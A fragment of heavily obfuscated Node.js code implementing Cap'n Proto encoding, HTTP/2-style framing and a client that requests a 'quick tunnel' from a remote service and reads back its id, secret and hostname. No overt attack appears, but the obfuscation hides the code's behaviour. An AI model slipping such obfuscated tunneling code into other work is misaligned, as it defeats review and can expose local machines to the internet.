                'OJfDR': function (g, h) {
                    return g | h;
                },
                'BoPkL': function (g, h) {
                    return g & h;
                },
                'DPoPj': function (g, h) {
                    return g << h;
                },
                'pPKJX': function (g, h) {
                    return g(h);
                },
                'gqtYb': function (g, h) {
                    return g(h);
                }
            }, f = d[d1(0x4c7)](0xffn, d[d1(0x67e)](BigInt, d['xLyQJ'](b, 0x8)));
        this[d1(0x598)][a] = d[d1(0x371)](d['BoPkL'](this['words'][a], ~f), d[d1(0x293)](d[d1(0x502)](BigInt, c & 0xff), d[d1(0x590)](BigInt, d[d1(0x320)](b, 0x8))));
    }
    [a0aW(0x233)](a, b, c) {
        const d2 = a0aW, d = {
                'kAWyb': function (g, h) {
                    return g << h;
                },
                'MHdhq': function (g, h) {
                    return g(h);
                },
                'WkekP': function (g, h) {
                    return g * h;
                },
                'pwqKx': function (g, h) {
                    return g | h;
                },
                'HKwvp': function (g, h) {
                    return g << h;
                },
                'TgpIr': function (g, h) {
                    return g(h);
                },
                'pKQKT': function (g, h) {
                    return g & h;
                },
                'NtIRq': function (g, h) {
                    return g(h);
                }
            }, f = d[d2(0x563)](0xffffn, d[d2(0x15f)](BigInt, d[d2(0x1ce)](b, 0x8)));
        this[d2(0x598)][a] = d[d2(0x798)](this[d2(0x598)][a] & ~f, d['HKwvp'](d[d2(0x27a)](BigInt, d['pKQKT'](c, 0xffff)), d[d2(0x7be)](BigInt, d[d2(0x1ce)](b, 0x8))));
    }
    [a0aW(0x58c)](a, b, c) {
        const d3 = a0aW, d = {
                'rYRfW': function (g, h) {
                    return g << h;
                },
                'gQXGq': function (g, h) {
                    return g | h;
                },
                'MvRZl': function (g, h) {
                    return g(h);
                },
                'LvtcS': function (g, h) {
                    return g & h;
                },
                'CjEId': function (g, h) {
                    return g(h);
                },
                'ShTqb': function (g, h) {
                    return g * h;
                }
            }, f = d['rYRfW'](0xffffffffn, BigInt(b * 0x8));
        this[d3(0x598)][a] = d[d3(0x6f0)](this[d3(0x598)][a] & ~f, d[d3(0x83f)](BigInt, d[d3(0x5fc)](c, 0xffffffff)) << d[d3(0x860)](BigInt, d[d3(0x1f6)](b, 0x8)));
    }
    ['setU64'](a, b) {
        const d4 = a0aW, c = {
                'mAazi': function (d, f) {
                    return d & f;
                },
                'ElMRm': function (d, f) {
                    return d(f);
                }
            };
        this['words'][a] = c[d4(0x182)](c['ElMRm'](BigInt, b), 0xffffffffffffffffn);
    }
    [a0aW(0x383)](a, b, c = ![]) {
        const d5 = a0aW, d = {
                'GvJyy': function (m, n) {
                    return m === n;
                },
                'koUeH': d5(0x1fc),
                'FSjKy': d5(0x736),
                'KZGnr': function (m, n) {
                    return m + n;
                },
                'zHIdo': function (m, n) {
                    return m / n;
                },
                'myGbd': function (m, n) {
                    return m < n;
                },
                'mpiaP': function (m, n) {
                    return m + n;
                },
                'CBKGx': function (m, n) {
                    return m % n;
                },
                'vtrcA': function (m, n) {
                    return m - n;
                },
                'VyeGs': function (m, n) {
                    return m - n;
                },
                'yCyfS': function (m, n) {
                    return m & n;
                },
                'EbEAS': function (m, n) {
                    return m << n;
                },
                'rEISp': function (m, n) {
                    return m | n;
                },
                'AiMFI': function (m, n) {
                    return m << n;
                },
                'QBfcn': function (m, n) {
                    return m << n;
                }
            }, f = d[d5(0x473)](typeof b, d[d5(0x68a)]) ? Buffer[d5(0x7e4)](b, d[d5(0x190)]) : b, g = d[d5(0x633)](f[d5(0x650)], c ? 0x1 : 0x0), h = this[d5(0x605)](Math['ceil'](d[d5(0x441)](g, 0x8)));
        for (let m = 0x0; d[d5(0x1c3)](m, f[d5(0x650)]); m++) {
            this[d5(0x623)](d[d5(0x51f)](h, Math[d5(0x695)](m / 0x8)), d['CBKGx'](m, 0x8), f[m]);
        }
        const j = d['vtrcA'](d[d5(0x606)](h, a), 0x1), k = d['yCyfS'](d[d5(0x1cb)](BigInt(j), 0x2n) | 0x1n, 0xffffffffn), l = d[d5(0x34a)](0x2n, d[d5(0x46a)](BigInt(d['yCyfS'](g, 0x1fffffff)), 0x3n));
        this[d5(0x598)][a] = d[d5(0x34a)](k, d['QBfcn'](l, 0x20n));
    }
    [a0aW(0x4b1)](a, b) {
        const d6 = a0aW, c = {
                'EKAaP': function (g, h) {
                    return g | h;
                },
                'ZzEBT': function (g, h) {
                    return g << h;
                },
                'JbQHs': function (g, h) {
                    return g(h);
                },
                'sEypw': function (g, h) {
                    return g << h;
                },
                'XviFG': function (g, h) {
                    return g < h;
                }
            };
        if (!b['length']) {
            this[d6(0x598)][a] = 0x0n;
            return;
        }
        const d = this[d6(0x605)](b[d6(0x650)]), f = d - a - 0x1;
        this[d6(0x598)][a] = c[d6(0x622)](c[d6(0x622)](c[d6(0x620)](c[d6(0x7e8)](BigInt, f), 0x2n), 0x1n) & 0xffffffffn, c[d6(0x5aa)](0x6n | BigInt(b[d6(0x650)]) << 0x3n, 0x20n));
        for (let g = 0x0; c['XviFG'](g, b[d6(0x650)]); g++) {
            this[d6(0x383)](d + g, b[g], !![]);
        }
    }
    [a0aW(0x6d7)]() {
        const d7 = a0aW, a = {
                'BRrRU': function (d, f) {
                    return d * f;
                },
                'FsLpJ': function (d, f) {
                    return d < f;
                },
                'qhSnr': function (d, f) {
                    return d * f;
                }
            }, b = Buffer[d7(0x605)](0x8);
        b[d7(0x490)](0x0, 0x0), b['writeUInt32LE'](this[d7(0x598)][d7(0x650)], 0x4);
        const c = Buffer['alloc'](a[d7(0x593)](this[d7(0x598)]['length'], 0x8));
        for (let d = 0x0; a[d7(0x3c6)](d, this['words'][d7(0x650)]); d++) {
            c[d7(0x264)](this[d7(0x598)][d] & 0xffffffffffffffffn, a[d7(0x4c1)](d, 0x8));
        }
        return Buffer[d7(0x85e)]([
            b,
            c
        ]);
    }
}
function a0aj(a) {
    const d8 = a0aW, b = new a0ai(), c = b[d8(0x605)](0x1), d = b['alloc'](0x1), f = b[d8(0x605)](0x1);
    b[d8(0x43d)](c, d, 0x1, 0x1), b[d8(0x233)](d, 0x0, 0x8);
    const g = b[d8(0x605)](0x1);
    return b[d8(0x605)](0x1), b[d8(0x43d)](f, g, 0x1, 0x1), b[d8(0x58c)](g, 0x0, a), b['finish']();
}
function a0ak(a, b, c, d, f, g) {
    const d9 = a0aW, h = {
            'iUPUG': function (H, I) {
                return H | I;
            },
            'JwKZm': function (H, I) {
                return H & I;
            },
            'bqJXD': function (H, I) {
                return H | I;
            },
            'MrHrf': d9(0x732),
            'YtTYw': d9(0x23a),
            'OJPaN': d9(0x346),
            'xOike': d9(0x461)
        }, i = new a0ai(), j = i[d9(0x605)](0x1), k = i[d9(0x605)](0x1), l = i[d9(0x605)](0x1);
    i[d9(0x43d)](j, k, 0x1, 0x1), i[d9(0x233)](k, 0x0, 0x2);
    const m = i[d9(0x605)](0x1), n = i['alloc'](0x1);
    i[d9(0x605)](0x1);
    const o = i[d9(0x605)](0x1), p = i['alloc'](0x1);
    i[d9(0x605)](0x1), i[d9(0x43d)](l, m, 0x3, 0x3), i[d9(0x58c)](m, 0x0, a), i[d9(0x472)](n, 0xf71695ec7fe85497n);
    const q = i[d9(0x605)](0x1), r = i[d9(0x605)](0x1);
    i['structPtr'](o, q, 0x1, 0x1), i[d9(0x233)](q, 0x4, 0x1);
    const s = i['alloc'](0x1);
    i[d9(0x605)](0x1), i[d9(0x43d)](r, s, 0x1, 0x1), i[d9(0x58c)](s, 0x0, b);
    const t = i[d9(0x605)](0x1);
    i[d9(0x605)](0x1), i[d9(0x43d)](p, t, 0x0, 0x2);
    const u = i['alloc'](0x1), v = i[d9(0x605)](0x1), w = i[d9(0x605)](0x1), x = i[d9(0x605)](0x1);
    i[d9(0x43d)](t, u, 0x1, 0x3), i[d9(0x623)](u, 0x0, g);
    const y = i[d9(0x605)](0x1), z = i['alloc'](0x1);
    i[d9(0x43d)](v, y, 0x0, 0x2), i[d9(0x383)](y, c, !![]), i[d9(0x383)](z, d), i[d9(0x383)](w, f);
    const A = i[d9(0x605)](0x1), B = i[d9(0x605)](0x1);
    i['alloc'](0x1), i[d9(0x43d)](x, A, 0x1, 0x2);
    const C = i['alloc'](0x1), D = i[d9(0x605)](0x1), E = i[d9(0x605)](0x1), F = i[d9(0x605)](0x1);
    i[d9(0x43d)](B, C, 0x0, 0x4);
    const G = a0k[d9(0x273)](0x10);
    return G[0x6] = h[d9(0x340)](h[d9(0x19f)](G[0x6], 0xf), 0x40), G[0x8] = h['bqJXD'](h[d9(0x19f)](G[0x8], 0x3f), 0x80), i[d9(0x383)](C, G), i['writeTextList'](D, [
        h['MrHrf'],
        h[d9(0x641)]
    ]), i[d9(0x383)](E, h[d9(0x37c)], !![]), i[d9(0x383)](F, h['xOike'], !![]), i[d9(0x6d7)]();
}
function a0al(a) {
    const da = a0aW, b = {
            'vYuRT': function (f, g) {
                return f >= g;
            },
            'ntMuB': function (f, g) {
                return f - g;
            },
            'WQFVv': function (f, g) {
                return f + g;
            },
            'rckaw': function (f, g) {
                return f + g;
            },
            'KbQdj': function (f, g) {
                return f + g;
            },
            'zUYlq': function (f, g) {
                return f % g;
            },
            'GugZX': function (f, g) {
                return f < g;
            },
            'YLoqh': function (f, g) {
                return f !== g;
            },
            'fkxzJ': da(0x70e),
            'IjqrI': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b['vYuRT'](b[da(0x3f5)](a['length'], d), 0x8)) {
        const f = a[da(0x78c)](d), g = a[da(0x78c)](b[da(0x7b2)](d, 0x4)), h = b['rckaw'](f, 0x1);
        let j = b[da(0x467)](0x2, h), k = j * 0x4;
        b['zUYlq'](k, 0x8) && (k += 0x4);
        if (a['length'] - d < k)
            break;
        const l = [g];
        for (let n = 0x1; b['GugZX'](n, h); n++) {
            l[da(0x24a)](a['readUInt32LE'](d + 0x4 + n * 0x4));
        }
        const m = b['KbQdj'](k, l['reduce']((o, p) => o + p, 0x0) * 0x8);
        if (a[da(0x650)] - d < m)
            break;
        if (b[da(0x157)](h, 0x1))
            throw new Error(b['fkxzJ']);
        c[da(0x24a)](a[da(0x6a7)](b[da(0x191)](d, k), d + m)), d += m;
    }
    return [
        c,
        a[da(0x6a7)](d)
    ];
}
function a0am(a, b) {
    const db = a0aW, c = {
            'DyEFu': function (j, k) {
                return j >= k;
            },
            'zeUdj': db(0x5f2),
            'cKEpM': function (j, k) {
                return j !== k;
            },
            'hJnmj': function (j, k) {
                return j & k;
            },
            'ONSpi': 'expected\x20Cap\x27n\x20Proto\x20struct\x20pointer',
            'UELfF': function (j, k) {
                return j >> k;
            },
            'SYxks': function (j, k) {
                return j & k;
            },
            'VTmmk': function (j, k) {
                return j + k;
            },
            'Yhaib': function (j, k) {
                return j + k;
            },
            'MfARu': function (j, k) {
                return j(k);
            },
            'GmnbX': function (j, k) {
                return j >> k;
            },
            'dNvoV': function (j, k) {
                return j(k);
            },
            'yVhPW': function (j, k) {
                return j & k;
            },
            'xlDNo': function (j, k) {
                return j >> k;
            },
            'nELii': function (j, k) {
                return j < k;
            },
            'Cwhzu': function (j, k) {
                return j > k;
            }
        };
    if (c[db(0x20e)](b, a[db(0x650)]))
        throw new Error(c['zeUdj']);
    const d = a[b];
    if (c[db(0x4af)](c[db(0x306)](d, 0x3n), 0x0n))
        throw new Error(c['ONSpi']);
    let f = c[db(0x306)](c['UELfF'](d, 0x2n), 0x3fffffffn);
    c[db(0x586)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c['VTmmk'](c[db(0x804)](b, 0x1), c['MfARu'](Number, f)), h = c[db(0x53d)](Number, c['SYxks'](c['GmnbX'](d, 0x20n), 0xffffn)), i = c[db(0x7cf)](Number, c[db(0x36b)](c['xlDNo'](d, 0x30n), 0xffffn));
    if (c[db(0x6af)](g, 0x0) || c[db(0x4e6)](c[db(0x201)](g, h) + i, a['length']))
        throw new Error(c[db(0x327)]);
    return [
        g,
        h,
        i
    ];
}
function a0an(a, b) {
    const dc = a0aW, c = {
            'hyBUG': function (m, n) {
                return m >= n;
            },
            'mWuSw': function (m, n) {
                return m >> n;
            },
            'rnHzN': function (m, n) {
                return m & n;
            },
            'eMnMv': function (m, n) {
                return m + n;
            },
            'ZZUMt': function (m, n) {
                return m(n);
            },
            'ggSzR': function (m, n) {
                return m(n);
            },
            'kwrGU': function (m, n) {
                return m & n;
            },
            'SyvHc': function (m, n) {
                return m(n);
            },
            'CZBbU': function (m, n) {
                return m >> n;
            },
            'PfWqg': function (m, n) {
                return m !== n;
            },
            'RtkfX': function (m, n) {
                return m < n;
            },
            'tZCuA': function (m, n) {
                return m > n;
            },
            'IZfRo': function (m, n) {
                return m * n;
            },
            'NDbEG': function (m, n) {
                return m & n;
            },
            'GzKCG': function (m, n) {
                return m + n;
            },
            'FjxaR': function (m, n) {
                return m * n;
            }
        };
    if (c['hyBUG'](b, a[dc(0x650)]))
        return '';
    const d = a[b];
    if ((d & 0x3n) !== 0x1n)
        return '';
    let f = c['mWuSw'](d, 0x2n) & 0x3fffffffn;
    c[dc(0x7d8)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dc(0x7f8)](b, 0x1) + c['ZZUMt'](Number, f), h = c[dc(0x3f4)](Number, c[dc(0x4f3)](d >> 0x20n, 0x7n)), j = c[dc(0x697)](Number, c[dc(0x253)](d, 0x23n)), k = Math['ceil'](j / 0x8);
    if (c[dc(0x1aa)](h, 0x2) || c[dc(0x62a)](g, 0x0) || c[dc(0x54a)](g + k, a[dc(0x650)]))
        return '';
    const l = Buffer['alloc'](c[dc(0x49c)](k, 0x8));
    for (let m = 0x0; c[dc(0x62a)](m, k); m++) {
        l['writeBigUInt64LE'](c[dc(0x5c4)](a[c[dc(0x77d)](g, m)], 0xffffffffffffffffn), c['FjxaR'](m, 0x8));
    }
    return l[dc(0x6a7)](0x0, j)[dc(0x491)](dc(0x736))['replace'](/\0+$/, '');
}
function a0ao(a) {
    const dd = a0aW, b = {
            'hnrzU': function (z, A) {
                return z % A;
            },
            'NvvKK': function (z, A) {
                return z < A;
            },
            'MmHIj': dd(0x235),
            'SXHfw': function (z, A) {
                return z < A;
            },
            'OCniP': function (z, A) {
                return z * A;
            },
            'dptVm': function (y, z, A) {
                return y(z, A);
            },
            'kWsWj': function (z, A) {
                return z !== A;
            },
            'bXjKv': function (z, A) {
                return z & A;
            },
            'oWNGt': dd(0x4d9),
            'VRGEI': function (z, A) {
                return z + A;
            },
            'VdNzt': function (y, z) {
                return y(z);
            },
            'SAKNj': function (z, A) {
                return z >> A;
            },
            'BBrCs': function (y, z, A) {
                return y(z, A);
            },
            'fbDkQ': function (z, A) {
                return z + A;
            },
            'KjvFo': 'RPC\x20return\x20union\x20',
            'wfMNE': function (y, z, A) {
                return y(z, A);
            },
            'RdZJj': function (y, z, A) {
                return y(z, A);
            },
            'EMfYO': function (z, A) {
                return z === A;
            },
            'ejZXV': function (y, z, A) {
                return y(z, A);
            },
            'Cbjwv': function (z, A) {
                return z + A;
            },
            'vijVH': function (z, A) {
                return z + A;
            },
            'rsiIo': dd(0x519),
            'AUEvd': function (z, A) {
                return z + A;
            },
            'bfgiU': function (y, z) {
                return y(z);
            }
        };
    if (b[dd(0x698)](a[dd(0x650)], 0x8) || b[dd(0x87b)](a[dd(0x650)], 0x18))
        throw new Error(b[dd(0x6b3)]);
    const c = [];
    for (let y = 0x0; b[dd(0x4d7)](y, a['length'] / 0x8); y++) {
        c[dd(0x24a)](a['readBigUInt64LE'](b[dd(0x553)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b['dptVm'](a0am, c, 0x0);
    if (f < 0x1 || b[dd(0x4c2)](b[dd(0x689)](c[d], 0xffffn), 0x3n))
        throw new Error(b[dd(0x2c4)]);
    let h, j, k;
    [h, j, k] = b[dd(0x5b5)](a0am, c, b[dd(0x4a8)](d, f));
    const l = b[dd(0x56f)](Number, b[dd(0x689)](b[dd(0x21f)](c[h], 0x30n), 0xffffn));
    if (l === 0x1)
        return {
            'ok': ![],
            'error': b[dd(0x334)](a0an, c, b[dd(0x35c)](h, j))
        };
    if (l !== 0x0)
        return {
            'ok': ![],
            'error': b[dd(0x4a8)](b['KjvFo'], l)
        };
    let m, n, o;
    [m, n, o] = b[dd(0x3bb)](a0am, c, b['fbDkQ'](h, j));
    let p, q, r;
    [p, q, r] = b[dd(0x5e3)](a0am, c, m + n);
    const s = c[p], t = Number(s & 0xffffn);
    if (b[dd(0x7db)](t, 0x0))
        return {
            'ok': ![],
            'error': b['ejZXV'](a0an, c, b[dd(0x355)](p, q))
        };
    if (b[dd(0x4c2)](t, 0x1))
        return {
            'ok': ![],
            'error': b[dd(0x24e)](b[dd(0x1f9)], t)
        };
    let u, v, w;
    [u, v, w] = a0am(c, b[dd(0x173)](p, q));
    const x = b[dd(0x3bb)](a0an, c, u + v + 0x1);
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b['bfgiU'](Boolean, b[dd(0x689)](c[u], 0x1n))
    };
}
const a0ap = {
    '.js': a0aW(0x276),
    '.mjs': 'text/javascript;\x20charset=utf-8',
    '.css': a0aW(0x7d7),
    '.json': a0aW(0x716),
    '.map': a0aW(0x716),
    '.wasm': a0aW(0x517),
    '.html': a0aW(0x3f2),
    '.htm': a0aW(0x3f2),
    '.svg': a0aW(0x418),
    '.xml': 'application/xml',
    '.woff': a0aW(0x308),
    '.woff2': a0aW(0x308),
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': a0aW(0x189),
    '.gif': 'image/gif',
    '.ico': 'image/x-icon'
};
function a0aq(a) {
    const de = a0aW, b = a['endsWith']('/') ? a['slice'](0x0, -0x1) : a, c = b[de(0x68b)]('.');
    if (c < 0x0)
        return '';
    return a0ap[b[de(0x500)](c)[de(0x40a)]()] || '';
}
function a0ar(a) {
    const df = a0aW, b = {
            'FUTiG': df(0x274),
            'fYpGg': function (c, d) {
                return c + d;
            },
            'vDgnh': df(0x7f9)
        };
    if (Array[df(0x677)](a))
        return Buffer[df(0x7e4)](a);
    if (typeof a !== df(0x1fc))
        throw new Error(b[df(0x2f6)]);
    return Buffer['from'](b[df(0x1af)](a, '='[df(0x4aa)](-a[df(0x650)] % 0x4)), b[df(0x72a)]);
}
const a0as = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0at(a) {
    const dg = a0aW, b = {
            'jFAhN': function (c, d) {
                return c(d);
            },
            'VsRWk': function (c, d) {
                return c + d;
            },
            'ANdnP': function (c, d) {
                return c + d;
            },
            'tAAwZ': 'quick\x20tunnel\x20returned\x20non-JSON\x20(',
            'TIbHN': '):\x20',
            'cMJlg': dg(0x47e),
            'mfqTv': function (c, d) {
                return c(d);
            },
            'IYaRu': 'bad\x20tunnel\x20id',
            'XuZoz': function (c, d) {
                return c !== d;
            },
            'yBbbe': 'string',
            'swtne': dg(0x834),
            'DEshq': dg(0x342),
            'otAqX': dg(0x84c),
            'SSdhj': function (c, d) {
                return c + d;
            },
            'IyptX': function (c, d) {
                return c === d;
            },
            'gSYCP': 'https:',
            'EkHTr': dg(0x5c5),
            'OQDhP': dg(0x79c),
            'YqVUf': dg(0x5e7)
        };
    return new Promise((c, d) => {
        const dh = dg, f = {
                'nMRZW': dh(0x736),
                'daPEb': function (j, k) {
                    const di = dh;
                    return b[di(0x214)](j, k);
                },
                'VPBPr': function (j, k) {
                    return j + k;
                },
                'IYeWw': function (j, k) {
                    const dj = dh;
                    return b[dj(0x822)](j, k);
                },
                'poaFv': function (j, k) {
                    return b['ANdnP'](j, k);
                },
                'KvkjJ': b['tAAwZ'],
                'yVTqZ': b['TIbHN'],
                'HduFG': b[dh(0x6e0)],
                'zRMgJ': function (j, k) {
                    return b['mfqTv'](j, k);
                },
                'QsezP': b[dh(0x26d)],
                'gXurg': function (j, k) {
                    const dk = dh;
                    return b[dk(0x540)](j, k);
                },
                'FrOaL': b[dh(0x6ce)],
                'EmwkT': b[dh(0x665)],
                'KJECq': 'hex',
                'oejUH': dh(0x64d),
                'ZtVfu': b[dh(0x59a)]
            };
        let g;
        try {
            g = new URL(b[dh(0x3a9)](a[dh(0x676)](/\/+$/, ''), b['otAqX']));
        } catch (j) {
            b[dh(0x2a0)](d, new Error(b['SSdhj']('requesting\x20quick\x20tunnel\x20failed:\x20', j[dh(0x7df)])));
            return;
        }
        const h = b[dh(0x4f7)](g[dh(0x2cc)], b[dh(0x62c)]) ? a0h : a0g, i = h[dh(0x4e5)](g, {
                'method': 'POST',
                'headers': {
                    'Content-Type': b[dh(0x80d)],
                    'User-Agent': b[dh(0x4ea)]
                },
                'timeout': 0x3a98
            }, k => {
                const dl = dh, l = [];
                k['on'](f[dl(0x370)], m => l['push'](m)), k['on'](dl(0x5e7), d), k['on'](f[dl(0x41f)], () => {
                    const dm = dl, m = Buffer[dm(0x85e)](l), n = k[dm(0x475)];
                    let o;
                    try {
                        o = JSON[dm(0x4d3)](m['toString'](f['nMRZW']));
                    } catch (q) {
                        f[dm(0x2bb)](d, new Error(f[dm(0x4b7)](f[dm(0x449)](f[dm(0x21a)](f['KvkjJ'], n), f['yVTqZ']), m[dm(0x6a7)](0x0, 0x12c)['toString'](dm(0x736)))));
                        return;
                    }
                    const p = o[dm(0x1e0)] || {};
                    if (!(o[dm(0x782)] ?? !![]) || !p) {
                        f[dm(0x2bb)](d, new Error(f[dm(0x4b7)](f[dm(0x469)], JSON[dm(0x7ce)](o['errors']))));
                        return;
                    }
                    try {
                        const r = f['zRMgJ'](String, p['id']);
                        if (!a0as[dm(0x4ef)](r))
                            throw new Error(f[dm(0x1dd)]);
                        if (f[dm(0x48d)](typeof p[dm(0x3ef)], f['FrOaL']) || f[dm(0x48d)](typeof p['hostname'], f[dm(0x81c)]))
                            throw new Error(f[dm(0x694)]);
                        const s = f[dm(0x2bb)](a0ar, p[dm(0x78e)]), t = Buffer['from'](r['replace'](/-/g, ''), f['KJECq']);
                        f['daPEb'](c, [
                            p[dm(0x69c)],
                            p['account_tag'],
                            s,
                            t
                        ]);
                    } catch (u) {
                        f['zRMgJ'](d, new Error('invalid\x20quick\x20tunnel\x20response:\x20' + u['message']));
                    }
                });
            });
        i['on'](b[dh(0x3da)], k => d(new Error(dh(0x7f4) + k[dh(0x7df)]))), i[dh(0x342)]();
    });
}
function a0au(a) {
    const dn = a0aW;
    return a[dn(0x7d9)](([b, c]) => Buffer[dn(0x7e4)](b, 'utf8')[dn(0x491)](dn(0x7f9))[dn(0x676)](/=+$/, '') + ':' + Buffer[dn(0x7e4)](c, dn(0x736))[dn(0x491)](dn(0x7f9))[dn(0x676)](/=+$/, ''))['join'](';');
}
class a0av {
    constructor(a) {
        const dp = a0aW, b = {
                'bqZoV': dp(0x328),
                'FAGPl': dp(0x64d),
                'NrdiB': dp(0x1e9),
                'CvPQo': 'error'
            }, c = b[dp(0x57f)][dp(0x4c0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a['on'](b[dp(0x25a)], f => {
                    const dq = dp;
                    this[dq(0x2fd)] = this[dq(0x2fd)][dq(0x650)] ? Buffer[dq(0x85e)]([
                        this[dq(0x2fd)],
                        f
                    ]) : f, this[dq(0x365)]();
                });
                continue;
            case '1':
                this[dp(0x14d)] = a;
                continue;
            case '2':
                this[dp(0x7d6)] = ![];
                continue;
            case '3':
                this['buffer'] = Buffer['alloc'](0x0);
                continue;
            case '4':
                this[dp(0x4da)] = null;
                continue;
            case '5':
                a['on'](b['NrdiB'], () => {
                    const dr = dp;
                    this[dr(0x7d6)] = !![], this['_drain']();
                });
                continue;
            case '6':
                this[dp(0x3e8)] = [];
                continue;
            case '7':
                a['on'](b['CvPQo'], f => {
                    const ds = dp;
                    this['errored'] = f, this[ds(0x365)]();
                });
                continue;
            case '8':
                a['on'](dp(0x342), () => {
                    const dt = dp;
                    this[dt(0x7d6)] = !![], this[dt(0x365)]();
                });
                continue;
            }
            break;
        }
    }
    [a0aW(0x365)]() {
        const du = a0aW, a = {
                'KtgAJ': function (b, c) {
                    return b > c;
                },
                'MyygM': function (b, c) {
                    return b !== c;
                }
            };
        while (a[du(0x6dc)](this[du(0x3e8)][du(0x650)], 0x0)) {
            const b = this[du(0x3e8)][0x0];
            if (this[du(0x2fd)][du(0x650)] >= b[du(0x861)]) {
                this[du(0x3e8)][du(0x61f)]();
                const c = this[du(0x2fd)][du(0x6a7)](0x0, b[du(0x861)]);
                this[du(0x2fd)] = this['buffer'][du(0x6a7)](b[du(0x861)]), b[du(0x38c)](c);
            } else {
                if (a[du(0x864)](this[du(0x4da)], null))
                    this['waiters'][du(0x61f)](), b[du(0x696)](this[du(0x4da)]);
                else {
                    if (this[du(0x7d6)])
                        this[du(0x3e8)]['shift'](), b[du(0x696)](new Error('connection\x20closed'));
                    else
                        break;
                }
            }
        }
    }
    ['readExact'](a) {
        const dv = a0aW, b = {
                'iVTlS': function (c, d) {
                    return c !== d;
                },
                'AahNh': function (c, d) {
                    return c >= d;
                }
            };
        if (b['iVTlS'](this[dv(0x4da)], null))
            return Promise[dv(0x696)](this[dv(0x4da)]);
        if (b['AahNh'](this['buffer'][dv(0x650)], a)) {
            const c = this[dv(0x2fd)][dv(0x6a7)](0x0, a);
            return this[dv(0x2fd)] = this[dv(0x2fd)][dv(0x6a7)](a), Promise[dv(0x38c)](c);
        }
        if (this[dv(0x7d6)])
            return Promise['reject'](new Error(dv(0x829)));
        return new Promise((d, f) => {
            const dw = dv;
            this[dw(0x3e8)][dw(0x24a)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this['_drain']();
        });
    }
}
class a0aw {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const dx = a0aW;
        this[dx(0x303)] = a, this[dx(0x49f)] = new a0av(a), this[dx(0x54c)] = b, this[dx(0x726)] = c, this[dx(0x3b8)] = d, this[dx(0x7a2)] = f, this['connIndex'] = g, this['log'] = h, this['tunnelUrl'] = i, this[dx(0x585)] = j, this[dx(0x6d9)] = k || { 'printed': ![] }, this[dx(0x32a)] = new a0ae(), this['connectionWindow'] = 0xffff, this[dx(0x450)] = new Map(), this[dx(0x5e1)] = a0a5, this[dx(0x4ab)] = new Map(), this[dx(0x588)] = null, this[dx(0x672)] = ![], this[dx(0x36f)] = ![], this['registrationFailed'] = ![], this[dx(0x50c)] = [];
    }
    [a0aW(0x5b0)](a, b, c, d = Buffer[a0aW(0x605)](0x0)) {
        const dy = a0aW, f = {
                'VEWLh': function (h, i) {
                    return h > i;
                }
            };
        if (f[dy(0x856)](d[dy(0x650)], 0xffffff))
            throw new Error(dy(0x1a1));
        const g = Buffer[dy(0x605)](0x9);
        g['writeUIntBE'](d[dy(0x650)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[dy(0x5d6)](c & 0x7fffffff, 0x5), this[dy(0x303)][dy(0x805)](Buffer[dy(0x85e)]([
            g,
            d
        ]));
    }
    [a0aW(0x847)](a, b, c = ![]) {
        const dz = a0aW, d = {
                'mkKYd': function (h, i) {
                    return h(i);
                },
                'KIWDt': function (h, i) {
                    return h | i;
                }
            }, f = d[dz(0x7ea)](a0ah, b), g = d[dz(0x648)](0x4, c ? 0x1 : 0x0);
        this['sendFrame'](0x1, g, a, f);
    }
    ['_waitWindow'](a) {
        const dA = a0aW, b = {
                'qBjrz': function (c, d) {
                    return c > d;
                }
            };
        if (this[dA(0x6e4)] > 0x0 && b['qBjrz'](this['streamWindows'][dA(0x225)](a) ?? 0xffff, 0x0))
            return Promise['resolve']();
        return new Promise(c => {
            const dB = dA;
            this[dB(0x50c)][dB(0x24a)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aW(0x202)]() {
        const dC = a0aW, a = {
                'DLAbg': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[dC(0x50c)]) {
            const d = this[dC(0x450)][dC(0x225)](c[dC(0x564)]) ?? 0xffff;
            a[dC(0x845)](this[dC(0x6e4)], 0x0) && a[dC(0x845)](d, 0x0) ? c[dC(0x38c)]() : b['push'](c);
        }
        this[dC(0x50c)] = b;
    }
    [a0aW(0x4c6)]() {
        const dD = a0aW;
        for (const a of this[dD(0x50c)]) {
            a[dD(0x38c)]();
        }
        this[dD(0x50c)] = [];
    }
    async [a0aW(0x7ec)](a, b, c = ![]) {
        const dE = a0aW, d = {
                'UCDiN': function (h, i) {
                    return h - i;
                },
                'ioBTE': function (h, i) {
                    return h >= i;
                },
                'yKrkD': function (h, i) {
                    return h + i;
                },
                'urRfV': function (h, i) {
                    return h < i;
                }
            }, f = b[dE(0x650)];
        let g = 0x0;
        do {
            await this[dE(0x6ec)](a);
            if (this[dE(0x672)])
                return;
            const h = this[dE(0x450)]['get'](a) ?? 0xffff, i = Math['min'](d['UCDiN'](f, g), this[dE(0x6e4)], h, this['peerMaxFrame']), j = c && d['ioBTE'](g + i, f) ? 0x1 : 0x0, k = b[dE(0x6a7)](g, d[dE(0x212)](g, i));
            this[dE(0x6e4)] -= i, this['streamWindows'][dE(0x5ef)](a, d[dE(0x824)](h, i)), this[dE(0x5b0)](0x0, j, a, k), g += i;
        } while (d['urRfV'](g, f));
    }
    [a0aW(0x193)](a, b) {
        const dF = a0aW, c = {
                'Qmyjy': function (d, f) {
                    return d > f;
                },
                'HvBPj': function (d, f) {
                    return d & f;
                }
            };
        if (c['Qmyjy'](b, 0x0)) {
            const d = Buffer[dF(0x605)](0x4);
            d[dF(0x5d6)](c[dF(0x36c)](b, 0x7fffffff), 0x0), this['sendFrame'](0x8, 0x0, a, d);
        }
    }
    async ['readFrame']() {
        const dG = a0aW, a = {
                'QsRQr': function (i, j) {
                    return i & j;
                }
